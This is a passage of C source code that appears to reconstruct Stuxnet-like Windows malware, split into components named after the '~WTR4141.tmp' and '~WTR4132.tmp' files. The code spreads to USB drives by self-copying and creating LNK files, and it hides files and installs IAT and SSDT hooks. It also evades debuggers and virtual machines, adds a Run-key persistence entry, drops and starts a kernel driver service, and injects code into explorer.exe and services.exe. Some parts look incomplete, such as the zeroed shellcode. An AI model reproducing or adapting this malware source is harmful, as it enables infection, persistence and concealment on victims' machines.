    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    hSelf = CreateFileW(szSelfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        return FALSE;
    }
    dwSize = GetFileSize(hSelf, NULL);
    if (dwSize == 0) {
        CloseHandle(hSelf);
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hSelf);
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hSelf, pData, dwSize, &dwRead, NULL);
    CloseHandle(hSelf);
    WriteFile(hFile, pData, dwRead, &dwWritten, NULL);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pData);
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_PAYLOAD_NAME);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    WriteFile(hFile, pData, dwRead, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL WTR4141_InfectDrive(LPCWSTR szDrive) {
    if (!szDrive) return FALSE;
    wcscpy_s(g_Wtr4141Ctx.szDrivePath, WTR4141_MAX_PATH, szDrive);
    if (!WTR4141_IsDriveRemovable(szDrive)) {
        return FALSE;
    }
    WTR4141_CopyFilesToDrive();
    WTR4141_CreateLNKFiles();
    WTR4141_HideFiles();
    return TRUE;
}

static BOOL WTR4141_ScanDrives(VOID) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (WTR4141_IsDriveRemovable(szDrive)) {
                WTR4141_InfectDrive(szDrive);
            }
        }
    }
    return TRUE;
}

static BOOL WTR4141_Execute(VOID) {
    HANDLE hMutex;
    HMODULE hModule;
    if (!WTR4141_Init()) return FALSE;
    if (WTR4141_IsExpired()) {
        WTR4141_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, WTR4141_MUTEX);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        WTR4141_Cleanup();
        return FALSE;
    }
    if (WTR4141_CheckDebugger()) {
        CloseHandle(hMutex);
        WTR4141_Cleanup();
        return FALSE;
    }
    if (WTR4141_CheckVMware()) {
        CloseHandle(hMutex);
        WTR4141_Cleanup();
        return FALSE;
    }
    WTR4141_CheckRegistry();
    WTR4141_ReadRegistry();
    WTR4141_InstallIATHooks();
    WTR4141_InstallSSDTHooks();
    WTR4141_ScanDrives();
    WTR4141_StartWorker();
    while (WaitForSingleObject(g_Wtr4141Ctx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        WTR4141_ScanDrives();
        if (WTR4141_IsExpired()) {
            break;
        }
    }
    WTR4141_Cleanup();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            WTR4141_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WTR4141_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return WTR4141_ScanDrives() ? 0 : 1;
}

DWORD WINAPI Export3(LPCWSTR szDrive) {
    return WTR4141_InfectDrive(szDrive) ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return WTR4141_HideFiles() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return WTR4141_LoadPayload() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return WTR4141_InstallIATHooks() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return WTR4141_InstallSSDTHooks() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return WTR4141_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return WTR4141_StopWorker() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return WTR4141_CheckMutex() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return WTR4141_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    return WTR4141_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export13(VOID) {
    return WTR4141_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export14(VOID) {
    return WTR4141_CheckRegistry() ? 0 : 1;
}

DWORD WINAPI Export15(VOID) {
    return WTR4141_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export16(VOID) {
    return WTR4141_CreateLNKFiles() ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return WTR4141_CopyFilesToDrive() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return WTR4141_Init() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    WTR4141_Cleanup();
    return 0;
}

DWORD WINAPI Export20(VOID) {
    return (DWORD)g_Wtr4141Ctx.dwPid;
}

DWORD WINAPI Export21(VOID) {
    return (DWORD)g_Wtr4141Ctx.dwTid;
}

DWORD WINAPI Export22(VOID) {
    return g_Wtr4141Ctx.dwTickStart;
}

DWORD WINAPI Export23(VOID) {
    return GetTickCount();
}

DWORD WINAPI Export24(VOID) {
    return (DWORD)g_Wtr4141Ctx.hMutex;
}

DWORD WINAPI Export25(VOID) {
    return (DWORD)g_Wtr4141Ctx.hStopEvent;
}

DWORD WINAPI Export26(VOID) {
    return WTR4141_VERSION;
}

DWORD WINAPI Export27(VOID) {
    return WTR4141_MAGIC;
}

DWORD WINAPI Export28(VOID) {
    return (DWORD)g_Wtr4141Ctx.szDrivePath;
}

DWORD WINAPI Export29(VOID) {
    return (DWORD)g_Wtr4141Ctx.szModulePath;
}

DWORD WINAPI Export30(VOID) {
    return (DWORD)g_Wtr4141Ctx.szSystemPath;
}

DWORD WINAPI Export31(VOID) {
    return (DWORD)g_Wtr4141Ctx.szWindowsPath;
}

DWORD WINAPI Export32(VOID) {
    return (DWORD)g_Wtr4141Ctx.szTempPath;
}
END

~WTR4132.tmp:
 * MD5: 74ddc49a7c121a61b8d06c03f92d0c13
 * SHA256: 743e16b3ef4d39fc11c5e8ec890dcd29f034a6eca51be4f7fca6e23e60dbd7a1
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <winspool.h>
#include <wbemidl.h>
#include <comdef.h>
#include <shlwapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <aclapi.h>
#include <sddl.h>
#include <ntsecapi.h>
#include <winternl.h>

#pragma comment(lib, "winspool.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ntdll.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define WTR4132_MAGIC                   0x57545233
#define WTR4132_VERSION                 0x00010400
#define WTR4132_MAX_PATH                260
#define WTR4132_BUFFER_SIZE             4096
#define WTR4132_DLL_NAME                L"~WTR4132.tmp"
#define WTR4132_PAYLOAD_NAME            L"~WTR4141.tmp"

#define WTR4132_KERNEL32_ASLR           L"kernel32.dll.aslr."
#define WTR4132_SHELL32_ASLR            L"shell32.dll.aslr."

#define WTR4132_REG_KEY                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define WTR4132_REG_VALUE               L"19790509"

#define WTR4132_RESOURCE_DRIVER1        201
#define WTR4132_RESOURCE_DRIVER2        242
#define WTR4132_RESOURCE_PNF1           202
#define WTR4132_RESOURCE_PNF2           203
#define WTR4132_RESOURCE_PNF3           204
#define WTR4132_RESOURCE_PNF4           205
#define WTR4132_RESOURCE_EXPLOIT_RPC    221
#define WTR4132_RESOURCE_EXPLOIT_PRINT  222
#define WTR4132_RESOURCE_EXPLOIT_ELEV   250

#define WTR4132_EXPORT_INSTALL          15
#define WTR4132_EXPORT_DROP_DRIVERS     16
#define WTR4132_EXPORT_HOOK_DLL         17
#define WTR4132_EXPORT_USB_PROPAGATE    19
#define WTR4132_EXPORT_NETWORK_PROPAGATE 22

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

#define NtCurrentProcess()              ((HANDLE)(LONG_PTR)-1)

typedef struct _WTR4132_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[WTR4132_MAX_PATH];
    WCHAR szSystemPath[WTR4132_MAX_PATH];
    WCHAR szWindowsPath[WTR4132_MAX_PATH];
    WCHAR szTempPath[WTR4132_MAX_PATH];
    WCHAR szDriverPath[WTR4132_MAX_PATH];
    WCHAR szInfPath[WTR4132_MAX_PATH];
    BYTE bReserved[256];
} WTR4132_CTX, * PWTR4132_CTX;

typedef struct _WTR4132_RESOURCE_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwResourceCount;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    BYTE bReserved[32];
} WTR4132_RESOURCE_HEADER, * PWTR4132_RESOURCE_HEADER;

typedef struct _WTR4132_RESOURCE_ENTRY {
    DWORD dwType;
    DWORD dwID;
    DWORD dwOffset;
    DWORD dwSize;
    DWORD dwFlags;
    DWORD dwChecksum;
    BYTE bReserved[16];
} WTR4132_RESOURCE_ENTRY, * PWTR4132_RESOURCE_ENTRY;

typedef struct _WTR4132_HOOK_ENTRY {
    LPCSTR szDllName;
    LPCSTR szFuncName;
    PVOID pOriginal;
    PVOID pHook;
    BYTE bOriginalBytes[8];
} WTR4132_HOOK_ENTRY, * PWTR4132_HOOK_ENTRY;

static WTR4132_CTX g_Wtr4132Ctx;
static BOOL g_bInitialized = FALSE;
static BOOL g_bHooksInstalled = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwResourceCount = 0;
static WTR4132_RESOURCE_ENTRY g_ResourceEntries[32];
static PBYTE g_pResourceData = NULL;
static DWORD g_dwResourceDataSize = 0;

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PFN_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(HANDLE, PVOID*, PULONG, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *PFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static PFN_NtQuerySystemInformation pNtQuerySystemInformation = NULL;
static PFN_NtQueryInformationProcess pNtQueryInformationProcess = NULL;
static PFN_NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static PFN_NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
static PFN_NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
static PFN_NtCreateThreadEx pNtCreateThreadEx = NULL;
static PFN_RtlAdjustPrivilege pRtlAdjustPrivilege = NULL;

static BOOL WTR4132_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    pNtQuerySystemInformation = (PFN_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pNtQueryInformationProcess = (PFN_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    return TRUE;
}

static BOOL WTR4132_EnablePrivilege(LPCWSTR szPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, szPrivilege, &luid)) return FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return (GetLastError() == ERROR_SUCCESS);
}

static BOOL WTR4132_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL WTR4132_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Wtr4132Ctx.hMutex = hMutex;
    return TRUE;
}

static BOOL WTR4132_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    if (pNtQueryInformationProcess) {
        DWORD dwDebugPort = 0;
        if (NT_SUCCESS(pNtQueryInformationProcess(GetCurrentProcess(), 7, &dwDebugPort, sizeof(dwDebugPort), NULL)) && dwDebugPort != 0)
            return TRUE;
    }
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4132_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static VOID WTR4132_GetPaths(VOID) {
    GetModuleFileNameW(NULL, g_Wtr4132Ctx.szModulePath, WTR4132_MAX_PATH);
    GetSystemDirectoryW(g_Wtr4132Ctx.szSystemPath, WTR4132_MAX_PATH);
    GetWindowsDirectoryW(g_Wtr4132Ctx.szWindowsPath, WTR4132_MAX_PATH);
    GetTempPathW(WTR4132_MAX_PATH, g_Wtr4132Ctx.szTempPath);
    wsprintfW(g_Wtr4132Ctx.szDriverPath, L"%s\\drivers", g_Wtr4132Ctx.szSystemPath);
    wsprintfW(g_Wtr4132Ctx.szInfPath, L"%s\\inf", g_Wtr4132Ctx.szWindowsPath);
}

static DWORD WTR4132_GetLocalIPList(PDWORD pdwIPList, PDWORD pdwCount) {
    DWORD dwSize;
    PIP_ADAPTER_INFO pAdapter;
    PIP_ADAPTER_INFO pCurrent;
    DWORD dwIndex;
    if (!pdwIPList || !pdwCount) return 0;
    dwSize = 0;
    GetAdaptersInfo(NULL, &dwSize);
    if (dwSize == 0) return 0;
    pAdapter = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pAdapter) return 0;
    if (GetAdaptersInfo(pAdapter, &dwSize) != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pAdapter);
        return 0;
    }
    dwIndex = 0;
    pCurrent = pAdapter;
    while (pCurrent && dwIndex < *pdwCount) {
        if (pCurrent->IpAddressList.IpAddress.String[0] != '0') {
            pdwIPList[dwIndex++] = inet_addr(pCurrent->IpAddressList.IpAddress.String);
        }
        pCurrent = pCurrent->Next;
    }
    *pdwCount = dwIndex;
    HeapFree(GetProcessHeap(), 0, pAdapter);
    return dwIndex;
}

static DWORD WTR4132_GetSystemVersion(PDWORD pdwMajor, PDWORD pdwMinor, PDWORD pdwBuild) {
    RTL_OSVERSIONINFOW osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (RtlGetVersion(&osvi) != STATUS_SUCCESS) {
        return FALSE;
    }
    if (pdwMajor) *pdwMajor = osvi.dwMajorVersion;
    if (pdwMinor) *pdwMinor = osvi.dwMinorVersion;
    if (pdwBuild) *pdwBuild = osvi.dwBuildNumber;
    return TRUE;
}

static BOOL WTR4132_IsAdmin(VOID) {
    SID_IDENTIFIER_AUTHORITY nta = SECURITY_NT_AUTHORITY;
    PSID pSid = NULL;
    BOOL bAdmin = FALSE;
    if (AllocateAndInitializeSid(&nta, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSid)) {
        CheckTokenMembership(NULL, pSid, &bAdmin);
        FreeSid(pSid);
    }
    return bAdmin;
}

static BOOL WTR4132_GetComputerName(LPWSTR szName, DWORD dwSize) {
    DWORD dwLen = dwSize;
    return GetComputerNameW(szName, &dwLen);
}

static BOOL WTR4132_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szPath[WTR4132_MAX_PATH];
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, WTR4132_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, WTR4132_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    GetModuleFileNameW(NULL, szPath, WTR4132_MAX_PATH);
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"Stuxnet", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WTR4132_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WTR4132_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, WTR4132_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static VOID WTR4132_DecryptResource(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL WTR4132_LoadResources(VOID) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    PWTR4132_RESOURCE_HEADER pHeader;
    DWORD i;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    g_pResourceData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!g_pResourceData) return FALSE;
    memcpy(g_pResourceData, pData, dwSize);
    g_dwResourceDataSize = dwSize;
    WTR4132_DecryptResource(g_pResourceData, dwSize);
    pHeader = (PWTR4132_RESOURCE_HEADER)g_pResourceData;
    if (pHeader->dwMagic != STUXNET_MAGIC) {
        HeapFree(GetProcessHeap(), 0, g_pResourceData);
        g_pResourceData = NULL;
        return FALSE;
    }
    g_dwResourceCount = pHeader->dwResourceCount;
    memcpy(g_ResourceEntries, g_pResourceData + sizeof(WTR4132_RESOURCE_HEADER), g_dwResourceCount * sizeof(WTR4132_RESOURCE_ENTRY));
    return TRUE;
}

static BOOL WTR4132_ExtractResource(DWORD dwID, PBYTE* ppData, PDWORD pdwSize) {
    DWORD i;
    for (i = 0; i < g_dwResourceCount; i++) {
        if (g_ResourceEntries[i].dwID == dwID) {
            *ppData = g_pResourceData + g_ResourceEntries[i].dwOffset;
            *pdwSize = g_ResourceEntries[i].dwSize;
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL WTR4132_DropDriver(LPCWSTR szDriverName, DWORD dwResourceID) {
    PBYTE pData;
    DWORD dwSize;
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szPath[WTR4132_MAX_PATH];
    if (!WTR4132_ExtractResource(dwResourceID, &pData, &dwSize)) {
        return FALSE;
    }
    wsprintfW(szPath, L"%s\\%s", g_Wtr4132Ctx.szDriverPath, szDriverName);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL WTR4132_DropPNF(LPCWSTR szPNFName, DWORD dwResourceID) {
    PBYTE pData;
    DWORD dwSize;
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szPath[WTR4132_MAX_PATH];
    if (!WTR4132_ExtractResource(dwResourceID, &pData, &dwSize)) {
        return FALSE;
    }
    wsprintfW(szPath, L"%s\\%s", g_Wtr4132Ctx.szInfPath, szPNFName);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL WTR4132_LoadDriver(LPCWSTR szDriverName) {
    HANDLE hSCManager;
    HANDLE hService;
    WCHAR szPath[WTR4132_MAX_PATH];
    WCHAR szServiceName[64];
    wsprintfW(szServiceName, L"MRxCls");
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return FALSE;
    wsprintfW(szPath, L"%s\\%s", g_Wtr4132Ctx.szDriverPath, szDriverName);
    hService = CreateServiceW(hSCManager, szServiceName, szServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, szPath, NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        hService = OpenServiceW(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    StartServiceW(hService, 0, NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}

static BOOL WTR4132_InjectProcess(DWORD dwPID, LPVOID pShellcode, DWORD dwSize) {
    HANDLE hProcess;
    HANDLE hThread;
    PVOID pMem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return FALSE;
    pMem = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    WriteProcessMemory(hProcess, pMem, pShellcode, dwSize, NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }
    VirtualFreeEx(hProcess, pMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

static BOOL WTR4132_InjectExplorer(VOID) {
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    DWORD dwPID;
    BYTE shellcode[0x1000];
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnap, &pe)) {
        CloseHandle(hSnap);
        return FALSE;
    }
    do {
        if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
            dwPID = pe.th32ProcessID;
            ZeroMemory(shellcode, sizeof(shellcode));
            WTR4132_InjectProcess(dwPID, shellcode, sizeof(shellcode));
            CloseHandle(hSnap);
            return TRUE;
        }
    } while (Process32NextW(hSnap, &pe));
    CloseHandle(hSnap);
    return FALSE;
}

static BOOL WTR4132_InjectServices(VOID) {
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    DWORD dwPID;
    BYTE shellcode[0x1000];
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnap, &pe)) {
        CloseHandle(hSnap);
        return FALSE;
    }
    do {
        if (_wcsicmp(pe.szExeFile, L"services.exe") == 0) {
            dwPID = pe.th32ProcessID;
            ZeroMemory(shellcode, sizeof(shellcode));
            WTR4132_InjectProcess(dwPID, shellcode, sizeof(shellcode));
            CloseHandle(hSnap);
            return TRUE;
        }
    } while (Process32NextW(hSnap, &pe));
    CloseHandle(hSnap);
    return FALSE;
}

static BOOL WTR4132_LoadMainDLL(VOID) {
    PBYTE pData;
    DWORD dwSize;
    HMODULE hModule;
    FARPROC pExport;
    WCHAR szAslrPath[WTR4132_MAX_PATH];
    WCHAR szSelfPath[WTR4132_MAX_PATH];
    DWORD dwRandom;
    if (!WTR4132_ExtractResource(1, &pData, &dwSize)) {
        return FALSE;
    }
    GetModuleFileNameW(NULL, szSelfPath, WTR4132_MAX_PATH);
    wcscpy_s(szAslrPath, WTR4132_MAX_PATH, g_Wtr4132Ctx.szWindowsPath);
    wcscat_s(szAslrPath, WTR4132_MAX_PATH, L"\\");
    wcscat_s(szAslrPath, WTR4132_MAX_PATH, WTR4132_KERNEL32_ASLR);
    dwRandom = GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)(ULONG_PTR)pData;
    wsprintfW(szAslrPath + wcslen(szAslrPath), L"%08x", dwRandom);
    wcscat_s(szAslrPath, WTR4132_MAX_PATH, L".dll");
    if (!CopyFileW(szSelfPath, szAslrPath, FALSE)) {
        return FALSE;
    }
    hModule = LoadLibraryW(szAslrPath);
    if (!hModule) {
        DeleteFileW(szAslrPath);
        return FALSE;
    }
    pExport = GetProcAddress(hModule, "Export15");
    if (pExport) {
        ((void (*)(void))pExport)();
    }
    DeleteFileW(szAslrPath);
    return TRUE;
}

static BOOL WTR4132_Init(VOID) {
    DWORD dwMajor, dwMinor, dwBuild;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Wtr4132Ctx, sizeof(WTR4132_CTX));
    g_Wtr4132Ctx.dwMagic = WTR4132_MAGIC;
    g_Wtr4132Ctx.dwVersion = WTR4132_VERSION;
    g_Wtr4132Ctx.dwPid = GetCurrentProcessId();
